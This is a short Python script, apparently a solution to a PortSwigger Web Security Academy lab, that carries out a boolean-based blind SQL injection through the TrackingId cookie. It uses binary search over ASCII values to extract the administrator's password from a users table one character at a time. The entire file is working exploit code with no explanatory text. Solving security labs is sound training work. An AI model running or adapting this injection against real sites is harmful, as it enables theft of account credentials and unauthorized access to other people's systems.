import requests

url = 'https://0acf00a70438cc6b82712ef400db0056.web-security-academy.net/'
key = "Welcome back!"

payload = ''

found = False

def is_true_condition(payload):
    cookies = {
        'TrackingId': 'iqaEges06mgwkWga' + payload,
        'session': 'D3xnJTfKn1XPteHtgPkFgh5an1lDVQ9i',
    }

    r = requests.get(url, cookies=cookies)
    return key in r.text

def find_pass():
    password = ''
    position = 1
    while True:
        left = 32
        right = 126
        found = False
        while left <= right:
            mid = (left + right) // 2
            char = chr(mid)
            payload = f"' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='administrator'), {position}, 1)) > {mid}--"
            if is_true_condition(payload):
                left = mid + 1
            else:
                payload = f"' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='administrator'), {position}, 1)) < {mid}--"
                if is_true_condition(payload):
                    right = mid - 1
                else:
                    password += char
                    print(f"[+] Found Password: {password}")
                    position += 1
                    found = True
                    break
        if not found:
            break
    print(f"Final Password: {password}")

find_pass()